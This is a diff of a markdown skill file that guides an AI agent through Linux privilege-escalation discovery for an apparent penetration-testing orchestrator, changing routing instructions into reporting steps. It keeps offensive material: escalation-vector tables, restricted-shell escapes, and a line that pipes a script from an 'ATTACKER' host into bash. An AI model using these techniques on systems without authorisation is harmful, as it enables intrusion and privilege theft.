@@ -41,16 +41,14 @@ When an engagement directory exists:
 ## Scope Boundary
 
 This skill covers Linux host discovery — enumerating system configuration,
-identifying privilege escalation vectors, and routing to technique skills. When
-you reach the boundary of this scope — whether through a routing instruction
-("Route to **skill-name**") or by discovering findings outside your domain —
-**STOP**.
+identifying privilege escalation vectors, and reporting findings to the
+orchestrator. When you confirm an exploitable vector — **STOP**.
 
 Do not load or execute another skill. Do not continue past your scope boundary.
 Instead, return to the orchestrator with:
   - What was found (vulns, credentials, access gained)
-  - Recommended next skill (the bold **skill-name** from routing instructions)
-  - Context to pass (injection point, target, working payloads, etc.)
+  - Detection details (finding type, affected binary/service, evidence)
+  - Context for technique execution (hostname, kernel version, current user, etc.)
 
 The orchestrator decides what runs next. Your job is to execute this skill
 thoroughly and return clean findings.
@@ -150,18 +148,18 @@ who
 last -20 2>/dev/null
 ```
 
-**Group membership (routes to specific vectors):**
+**Group membership (privesc-relevant groups):**
 
-| Group | Escalation Vector | Route To |
-|-------|-------------------|----------|
-| `docker` | Mount host filesystem via container | **linux-file-path-abuse** |
-| `lxd` / `lxc` | Privileged container escape | **linux-file-path-abuse** |
-| `disk` | Raw disk read (debugfs) → read /etc/shadow | **linux-file-path-abuse** |
-| `adm` | Read /var/log/* (credential hunting) | Manual review |
-| `sudo` / `wheel` | Sudo configuration | **linux-sudo-suid-capabilities** |
-| `video` | Framebuffer access (keylogger) | Manual review |
-| `input` | Input device access (keylogger) | Manual review |
-| `staff` | Write to /usr/local (PATH hijack) | **linux-file-path-abuse** |
+| Group | Escalation Vector |
+|-------|-------------------|
+| `docker` | Mount host filesystem via container |
+| `lxd` / `lxc` | Privileged container escape |
+| `disk` | Raw disk read (debugfs) → read /etc/shadow |
+| `adm` | Read /var/log/* (credential hunting) |
+| `sudo` / `wheel` | Sudo configuration |
+| `video` | Framebuffer access (keylogger) |
+| `input` | Input device access (keylogger) |
+| `staff` | Write to /usr/local (PATH hijack) |
 
 ## Step 3: Sudo Configuration
 
@@ -197,19 +195,18 @@ memory error. A "usage:" response means the build is patched regardless of versi
 
 **What to look for in `sudo -l` output:**
 
-| Pattern | Meaning | Route To |
-|---------|---------|----------|
-| `(root) NOPASSWD: /path/to/binary` | Run as root, no password | **linux-sudo-suid-capabilities** |
-| `env_keep += LD_PRELOAD` | LD_PRELOAD injection with sudo | **linux-sudo-suid-capabilities** |
-| `env_keep += LD_LIBRARY_PATH` | Library path hijack with sudo | **linux-sudo-suid-capabilities** |
-| `SETENV:` before command | Can set env vars (LD_PRELOAD) | **linux-sudo-suid-capabilities** |
-| `(ALL, !root) ALL` | CVE-2019-14287 candidate | **linux-sudo-suid-capabilities** |
-| Binary without full path | PATH hijack | **linux-sudo-suid-capabilities** |
-| Editor/pager/interpreter | GTFOBins escape | **linux-sudo-suid-capabilities** |
+| Pattern | Meaning |
+|---------|---------|
+| `(root) NOPASSWD: /path/to/binary` | Run as root, no password |
+| `env_keep += LD_PRELOAD` | LD_PRELOAD injection with sudo |
+| `env_keep += LD_LIBRARY_PATH` | Library path hijack with sudo |
+| `SETENV:` before command | Can set env vars (LD_PRELOAD) |
+| `(ALL, !root) ALL` | CVE-2019-14287 candidate |
+| Binary without full path | PATH hijack |
+| Editor/pager/interpreter | GTFOBins escape |
 
-If `sudo -l` returns anything usable → STOP. Return to orchestrator recommending
-**linux-sudo-suid-capabilities**. Pass: hostname, current user, sudo -l output,
-sudo version. Do not execute privilege escalation commands inline.
+If `sudo -l` returns anything usable → STOP. Report: hostname, current user,
+sudo -l output, sudo version. Do not execute privilege escalation commands inline.
 
 **Doas (OpenBSD alternative):**
 
@@ -239,13 +236,12 @@ which dbus-send 2>/dev/null
 ps aux 2>/dev/null | grep polkit
 ```
 
-| Condition | CVE | Route To |
-|-----------|-----|----------|
-| polkit < 0.120 + pkexec has SUID bit | CVE-2021-4034 (PwnKit) | **linux-sudo-suid-capabilities** |
-| polkit < 0.117 + accountsservice + dbus-send | CVE-2021-3560 (D-Bus auth bypass) | **linux-sudo-suid-capabilities** |
+| Condition | CVE |
+|-----------|-----|
+| polkit < 0.120 + pkexec has SUID bit | CVE-2021-4034 (PwnKit) |
+| polkit < 0.117 + accountsservice + dbus-send | CVE-2021-3560 (D-Bus auth bypass) |
 
-If either polkit CVE prerequisite is met → STOP. Return to orchestrator
-recommending **linux-sudo-suid-capabilities**. Pass: hostname, current user,
+If either polkit CVE prerequisite is met → STOP. Report: hostname, current user,
 polkit version, pkexec SUID status, accountsservice presence. Do not execute
 exploitation commands inline.
 
@@ -271,16 +267,15 @@ pkaction --verbose 2>/dev/null | grep -B5 "allow_active.*yes" | grep -E "^org\.|
 
 **What to look for:**
 
-| Finding | Meaning | Route To |
-|---------|---------|----------|
-| `user_readenv=1` in PAM config | Can inject XDG_SEAT/XDG_VTNR via ~/.pam_environment | **linux-sudo-suid-capabilities** |
-| `Active=no` + `user_readenv=1` | SSH session can be upgraded to Active=yes | **linux-sudo-suid-capabilities** |
-| `allow_active=yes` on udisks2, systemd, or other dangerous actions | Active session can perform privileged operations without auth | **linux-sudo-suid-capabilities** |
+| Finding | Meaning |
+|---------|---------|
+| `user_readenv=1` in PAM config | Can inject XDG_SEAT/XDG_VTNR via ~/.pam_environment |
+| `Active=no` + `user_readenv=1` | SSH session can be upgraded to Active=yes |
+| `allow_active=yes` on udisks2, systemd, or other dangerous actions | Active session can perform privileged operations without auth |
 
 If `user_readenv=1` is found AND polkit actions with `allow_active=yes` exist
-→ STOP. Return to orchestrator recommending **linux-sudo-suid-capabilities**.
-Pass: hostname, current user, PAM config showing user_readenv, loginctl session
-output, list of allow_active polkit actions (especially udisks2 loop-setup,
+→ STOP. Report: hostname, current user, PAM config showing user_readenv, loginctl
+session output, list of allow_active polkit actions (especially udisks2 loop-setup,
 filesystem resize/check). Do not execute exploitation commands inline.
 
 ## Step 4: SUID/SGID and Capabilities
@@ -334,8 +329,7 @@ getcap -r / 2>/dev/null
 | `cap_net_raw` | Raw sockets (sniffing, spoofing) |
 | `cap_setfcap` | Set capabilities on other binaries (chain to cap_setuid) |
 
-Any SUID/capability finding → STOP. Return to orchestrator recommending
-**linux-sudo-suid-capabilities**. Pass: hostname, current user, SUID binaries
+Any SUID/capability finding → STOP. Report: hostname, current user, SUID binaries
 or capabilities found, kernel version. Do not execute privilege
 escalation commands inline.
 
@@ -355,12 +349,12 @@ cat /etc/anacrontab 2>/dev/null
 
 **What to look for in cron output:**
 
-| Pattern | Escalation | Route To |
-|---------|-----------|----------|
-| Script you can write to | Replace with payload | **linux-cron-service-abuse** |
-| Command without full path | PATH hijack | **linux-cron-service-abuse** |
-| Wildcard `*` in command | Wildcard injection (tar, chown, rsync) | **linux-cron-service-abuse** |
-| Writable cron directory | Add cron job | **linux-cron-service-abuse** |
+| Pattern | Escalation |
+|---------|-----------|
+| Script you can write to | Replace with payload |
+| Command without full path | PATH hijack |
+| Wildcard `*` in command | Wildcard injection (tar, chown, rsync) |
+| Writable cron directory | Add cron job |
 
 **Systemd timers and services:**
 
@@ -385,8 +379,7 @@ sort /tmp/.ps_monitor | uniq -c | sort -rn | head -30
 
 Watch for root-owned processes that execute writable scripts or use relative paths.
 
-Any finding here → STOP. Return to orchestrator recommending
-**linux-cron-service-abuse**. Pass: hostname, current user, specific findings
+Any finding here → STOP. Report: hostname, current user, specific findings
 (writable scripts, wildcard commands, writable unit files), kernel version.
 Do not execute exploitation commands inline.
 
@@ -452,10 +445,9 @@ echo $PATH | tr ':' '\n' | while read dir; do
 done
 ```
 
-Any finding here → STOP. Return to orchestrator recommending
-**linux-file-path-abuse**. Pass: hostname, current user, specific findings
-(writable files, group memberships, library paths), kernel version, current
-mode. Do not execute exploitation commands inline.
+Any finding here → STOP. Report: hostname, current user, specific findings
+(writable files, group memberships, library paths), kernel version. Do not
+execute exploitation commands inline.
 
 ## Step 7: Credential Hunting (Quick Scan)
 
@@ -534,7 +526,7 @@ done
 ls -la /var/run/docker.sock 2>/dev/null
 ```
 
-Writable Docker socket → route to **linux-file-path-abuse**.
+Writable Docker socket → report for container escape / file path abuse.
 Internal services on loopback → investigate for exploitation.
 
 **STOP — write interim findings NOW.** Before continuing to Step 9:
@@ -607,10 +599,9 @@ cat /proc/version
 perl linux-exploit-suggester-2.pl -k $(uname -r)
 ```
 
-Match kernel version against known exploits → STOP. Return to orchestrator
-recommending **linux-kernel-exploits**. Pass: hostname, kernel version,
-distribution, architecture, compiler availability, exploit-suggester output.
-Do not execute kernel exploits inline.
+Match kernel version against known exploits → STOP. Report: hostname, kernel
+version, distribution, architecture, compiler availability, exploit-suggester
+output. Do not execute kernel exploits inline.
 
 ## Step 11: Automated Enumeration Tools
 
@@ -671,62 +662,20 @@ curl -sL https://ATTACKER/linpeas.sh | bash
 ./pspy64 -pf -i 1000
 ```
 
-## Step 12: Routing Decision Tree
+## Step 12: Return to Orchestrator
 
-Based on enumeration findings, route to the appropriate technique skill:
+STOP and return to the orchestrator with all findings. Present findings ranked
+by reliability and OPSEC:
 
-### Sudo / SUID / Capabilities / Polkit Found
-
-`sudo -l` returns usable entries, SUID binaries with GTFOBins matches, sudo version
-vulnerable to CVE-2021-3156 (VERIFIED with `sudoedit -s '\'`) or CVE-2019-14287,
-capabilities on binaries, polkit CVE-2021-4034 (pkexec SUID) or CVE-2021-3560
-(polkit < 0.117 + accountsservice + dbus-send), PAM `user_readenv=1` with
-polkit `allow_active=yes` on dangerous actions (udisks2 loop-setup/resize,
-systemd reboot/poweroff)
-→ STOP. Return to orchestrator recommending **linux-sudo-suid-capabilities**.
-  Pass: hostname, current user, specific findings (sudo entries / SUID binaries /
-  capabilities / polkit version and pkexec SUID status / PAM user_readenv +
-  polkit allow_active actions), kernel version.
-  Do not execute privilege escalation commands inline.
-
-### Scheduled Task / Service Vectors Found
-
-Writable cron scripts, wildcard injection in cron commands, writable systemd unit files,
-exploitable D-Bus services, writable Unix sockets
-→ STOP. Return to orchestrator recommending **linux-cron-service-abuse**. Pass:
-  hostname, current user, specific findings (writable cron scripts / wildcard
-  commands / writable unit files / D-Bus services), kernel version, current
-  mode. Do not execute exploitation commands inline.
-
-### File / Path / Group Abuse Vectors Found
-
-Writable /etc/passwd or /etc/shadow, NFS no_root_squash, writable library paths,
-docker/lxd group membership, writable PATH directories, Python path hijack, shared
-object injection, writable profile scripts
-→ STOP. Return to orchestrator recommending **linux-file-path-abuse**. Pass:
-  hostname, current user, specific findings (writable files / NFS exports /
-  library paths / group memberships), kernel version. Do not
-  execute exploitation commands inline.
-
-### Kernel Exploit Candidates Found
-
-Kernel version matches known CVE (DirtyPipe, DirtyCow, GameOver(lay)), exploit-suggester
-returns hits, old unpatched kernel, compiler available on target
-→ STOP. Return to orchestrator recommending **linux-kernel-exploits**. Pass:
-  hostname, kernel version, distribution, architecture, compiler availability,
-  exploit-suggester output. Do not execute kernel exploits inline.
-
-### Multiple Vectors Found
-
-Present all findings ranked by reliability and OPSEC:
 1. Sudo NOPASSWD / SUID (near-certain, low OPSEC)
 2. Capabilities with cap_setuid (direct root, low OPSEC)
 3. Writable cron/service scripts (reliable, wait for execution)
 4. File permission abuse (reliable if writable)
 5. Kernel exploits (last resort — may crash system)
 
-When routing, pass along: hostname, kernel version, distribution, current user,
-specific findings.
+For each finding, pass along: hostname, kernel version, distribution, current
+user, specific findings (sudo entries, SUID binaries, capabilities, writable
+scripts, kernel CVEs, credentials found).
 
 ## Troubleshooting
 
@@ -742,9 +691,8 @@ commands. Focus on `sudo -l` (Step 3), SUID enumeration (Step 4), and cron revie
 ### Restricted shell (rbash, rksh)
 Try `bash` or `sh` to escape. If SUID bash exists: `bash -p`. Other breakouts:
 `vi` → `:set shell=/bin/bash` → `:shell`, or `awk 'BEGIN {system("/bin/bash")}'`.
-Route to **linux-kernel-exploits** for additional restricted shell escape techniques.
 
 ### In a container
 Check `/.dockerenv` or cgroup membership. Container-specific privesc vectors
-(cap_sys_admin + mount, Docker socket, privileged mode) route to
-**linux-file-path-abuse** for group/container escape techniques.
+(cap_sys_admin + mount, Docker socket, privileged mode) should be reported
+for container escape techniques.
